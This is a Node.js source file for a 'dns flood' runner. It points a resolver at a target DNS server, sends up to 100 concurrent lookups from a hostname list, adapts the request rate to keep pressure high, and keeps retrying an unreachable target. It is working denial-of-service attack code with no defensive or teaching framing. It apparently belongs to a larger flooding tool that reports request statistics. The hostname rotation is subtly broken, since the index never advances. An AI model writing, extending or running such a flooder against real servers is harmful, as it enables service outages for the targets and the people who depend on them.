const { Resolver } = require('dns/promises')

const { sleep } = require('./helpers')

const hostnames = require('../data/dns_hostnames.json')

const FAILURE_DELAY = 60 * 1000
const ATTEMPTS = 15

// wait 1ms if concurrent requests limit is reached
const REQ_DELAY = 1
let MAX_CONCURRENT_REQUESTS = 100

/**
 * @param {Object} opts
 * @param {string} opts.host dns host (ip address)
 * @param {number=53} [opts.port] dns port
 * @param {EventEmitter} eventEmitter
 * @return {Promise<void>}
 */
const runnerDns = async ({ host, port = 53 } = {}, eventEmitter) => {
  if (typeof host !== 'string' || typeof port !== 'number') {
    console.log('Invalid value for dns host:port', host, port)
    return
  }

  console.log(`Running dns flood for ${host}:${port}`)

  const resolver = new Resolver({ timeout: 6000, tries: 1 })
  resolver.setServers([host.includes(':') ? `[${host}]:${port}` : `${host}:${port}`])

  let concurrentReqs = MAX_CONCURRENT_REQUESTS
  let isRunning = true
  let isActive = true
  let pending = 0
  let lastMinuteOk = 0
  let lastMinuteErr = 0
  let failureAttempts = 0

  let errRate = 0
  let total_reqs = 0
  let new_reqs = 0
  let rps = 0

  const getStatsFn = () => {
    eventEmitter.emit('RUNNER_STATS', { type: 'dns', host, port, total_reqs, new_reqs, errRate, rps, isActive })
    new_reqs = 0
  }
  eventEmitter.on('GET_STATS', getStatsFn)

  const stopEventFn = () => {
    isRunning = false
  }
  eventEmitter.once('RUNNER_STOP', stopEventFn)

  const adaptivenessInterval = 10
  const adaptIntervalFn = () => {
    rps = Math.floor((lastMinuteOk + lastMinuteErr) / adaptivenessInterval)
    lastMinuteOk = 0
    lastMinuteErr = 0

    if (errRate > 50) {
      concurrentReqs = Math.floor(rps * 0.5)
    } else if (errRate > 20) {
      concurrentReqs = Math.floor(rps * 0.8)
    } else if (errRate > 9) {
      concurrentReqs = Math.floor(rps * 0.9)
    } else if (errRate < 2) {
      concurrentReqs = Math.min(rps + 5, MAX_CONCURRENT_REQUESTS)
    }

    if (concurrentReqs === 0) {
      isActive = false
    }
  }
  let adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)

  while (isRunning) {
    if (pending < concurrentReqs) {
      pending++
      resolver
        .resolve(getNextHostname())
        .then((d) => {
          d
          lastMinuteOk++
        })
        .catch((err) => {
          err
          lastMinuteErr++
        })
        .finally(() => {
          pending--
          total_reqs++
          new_reqs++
          errRate = Math.floor(100 * (lastMinuteErr / (1 + lastMinuteErr + lastMinuteOk)))
        })
    } else if (!isActive) {
      clearInterval(adaptInterval)
      const nextDelay = FAILURE_DELAY + failureAttempts * FAILURE_DELAY
      console.log(host, port, 'is not reachable. Retrying in', nextDelay, 'ms...')
      failureAttempts++
      if (failureAttempts >= ATTEMPTS) {
        isRunning = false
      } else {
        concurrentReqs = Math.floor(MAX_CONCURRENT_REQUESTS / 4)
        isActive = false
        await sleep(nextDelay)
        isActive = true
        lastMinuteOk = 0
        lastMinuteErr = 0
        errRate = 0
        adaptInterval = setInterval(adaptIntervalFn, adaptivenessInterval * 1000)
      }
    } else {
      await sleep(REQ_DELAY)
    }
  }

  clearInterval(adaptInterval)
  eventEmitter.off('GET_STATS', getStatsFn)
  eventEmitter.off('RUNNER_STOP', stopEventFn)
  console.log('Stopping dns runner for:', host, port)
}

let idx = 0
const getNextHostname = () => {
  if (idx >= hostnames.length) {
    idx = 0
  }
  return hostnames[idx]
}

const setMaxDnsReqs = (maxReqs) => {
  MAX_CONCURRENT_REQUESTS = maxReqs
}

module.exports = { runnerDns, setMaxDnsReqs }
